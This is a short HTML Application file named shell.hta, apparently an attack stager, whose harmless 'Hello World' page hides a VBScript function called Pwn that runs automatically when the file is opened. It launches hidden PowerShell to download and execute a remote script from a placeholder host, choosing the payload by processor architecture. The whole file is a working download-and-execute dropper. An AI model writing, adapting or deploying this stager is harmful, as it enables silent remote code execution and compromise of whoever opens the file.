# shell.hta

<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>aaaaaaa</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
  Function Pwn()
  Set shell = CreateObject("wscript.Shell")

  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:80/a'))"""
  Else
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:80/b'))"""
  End If

End Function
    Pwn
  </script>
</html>
